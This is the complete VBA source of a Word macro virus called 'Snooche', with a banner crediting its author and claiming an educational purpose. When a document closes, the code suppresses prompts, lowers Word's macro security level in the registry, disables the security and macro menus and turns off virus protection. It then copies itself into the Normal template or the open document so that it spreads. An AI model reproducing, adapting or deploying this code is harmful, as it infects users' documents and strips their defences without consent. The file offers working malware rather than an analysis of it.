   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Snooche"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
    On Error Resume Next
    Options.ConfirmConversions = 0
    Options.SaveNormalPrompt = 0
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
       CommandBars("Macro").Controls("Security...").Enabled = 0
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
     Else
       CommandBars("Tools").Controls("Macro").Enabled = 0
       Options.VirusProtection = 0
    End If
    Set vc = New DataObject
    Set ab = NormalTemplate.VBProject.VBComponents(1)
    Set cd = ActiveDocument.VBProject.VBComponents(1)
    With Snooche.VBProject.VBComponents(1).CodeModule
      vc.SetText .lines(1, .countoflines)
    End With
    If ab.Name <> "Snooche" Then
      With ab
       .CodeModule.deletelines 1, .CodeModule.countoflines
       .CodeModule.insertlines 1, vc.GetText
       .Name = "Snooche"
      End With
     ElseIf cd.Name <> "Snooche" Then
      With cd
       .CodeModule.deletelines 1, .CodeModule.countoflines
       .CodeModule.insertlines 1, vc.GetText
       .Name = "Snooche"
      End With
    End If
   End Sub
       '[][][][][][][][][][][][][][][][][][][]'
       '[]        WM97/WM2K/Snooche         []'
       '[]         Psyclone X /DVC          []'
       '[]   For Educational Purposes Only  []'
       '[][][][][][][][][][][][][][][][][][][]'
